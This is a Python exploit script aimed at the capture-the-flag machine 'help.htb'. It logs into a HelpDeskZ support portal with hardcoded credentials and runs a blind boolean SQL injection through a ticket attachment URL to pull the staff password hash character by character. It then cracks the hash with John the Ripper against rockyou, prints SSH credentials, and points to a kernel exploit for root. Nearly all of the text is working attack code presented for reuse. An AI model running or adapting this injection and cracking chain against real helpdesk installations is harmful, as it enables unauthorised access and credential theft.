'''
usage example: python3 help.py --rhost=x.x.x.x


##############################################
################ ENJOY FOLKS #################
##############################################
'''

#!/usr/bin/env python3
import pdb
import rich
import requests
import argparse
from pwn import *
from bs4 import BeautifulSoup
import string
import os

# Argument parser
parser = argparse.ArgumentParser()
parser.add_argument("-rhost", "--rhost", help="Remote host's IP", required=True)

args = parser.parse_args()
rhost = args.rhost



# Check if the script is run as root:
if not os.geteuid() == 0:
    rich.print("[red][+] Run this script as root! [/red]")
    sys.exit(1)

def Message():
    rich.print("[blue][+] ###############################################[/blue]")
    rich.print("[red][!]  UPLOAD test.txt FILE BEFORE RUNNING THIS SCRIPT [/red]")
    rich.print("[blue][+] ###############################################[/blue]")
    time.sleep(2)

def checkHost():
    # Add help.htb host to /etc/hosts if not added yet
    with open('/etc/hosts', 'r') as check:
        if f"{rhost} help.htb" not in check.read():
            rich.print("[red][+] help.htb is not added to /etc/hosts [/red]")
            rich.print("[yellow][+] Adding it ... [/yellow]")
            os.system(f"echo '{rhost} help.htb' >> /etc/hosts")
        else:
            pass

def MakeRequest():
    s = requests.Session()
    main_url = "http://help.htb/support/"
    # Retrieve cookie
    r = s.get(url=main_url)
    cookie = r.cookies.get('PHPSESSID')

    # Retrieve csrfhash
    r = s.get("http://help.htb/support/")
    csrf_hash = re.findall(r"csrfhash\" value=\"(.*?)\"", r.text)[0]

    # Log in
    login_url = "http://help.htb/support/?v=login"
    email = "helpme@helpme.com"
    password = "godhelpmeplz"

    cookies_data = {
        'PHPSESSID': cookie,
        'lang': 'english'
    }

    request_data = {
        'do': 'login',
        'csrfhash': csrf_hash,
        'email': email,
        'password': password,
        'btn': 'Login',
    }
    # Log in
    p = s.post(url=login_url, cookies=cookies_data, data=request_data, allow_redirects=True)
    if "Last Update" not in p.text:
        rich.print("[red][+] Login failed [/red]")
        sys.exit(1)
    else:
        pass

    # Get uploaded file's url
    tickets_url = "http://help.htb/support/?v=view_tickets&action=ticket&param[]=4"
    g = s.get(url=tickets_url)

    # Create a Beautiful Soup object from the HTML
    soup = BeautifulSoup(g.content, 'html.parser')

    # Find all links on the page and print their URLs
    all_links = soup.select('a[href]')

    penultimate_link = all_links[-2]['href']

    dictionary = string.ascii_lowercase + string.digits

    p1 = log.progress("Brute-forcing")
    p1.status("Starting bruteforce attack")
    time.sleep(1)

    password_hash = ""
    p2 = log.progress("password_hash")
    i = 0
    for i in range(1, 41):
        for word in dictionary:
            url = f"{penultimate_link}+and+substr((select+password+from+staff+limit+0,1),{i},1)+%3d+'{word}'--+-"
            r = s.get(url=url)
            if not "Page not found" in r.text:
                password_hash = password_hash + word
                p2.status(password_hash)
                i = i + 1
                break
    os.system(f"echo \"{password_hash}\" > password_hash")
    os.system(f"john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1 password_hash")
    rich.print("[green][+] Password hash cracked!: Welcome1 [/green]")
    rich.print("[yellow][+] Now you can login via SSH: help@help.htb:Welcome1 [/yellow]")
    rich.print("[blue][+] To get root, use a Linux 4.4.0-116-generic Kernel EXPLOIT  [/blue]")

if __name__ == "__main__":
    Message()
    checkHost()
    MakeRequest()
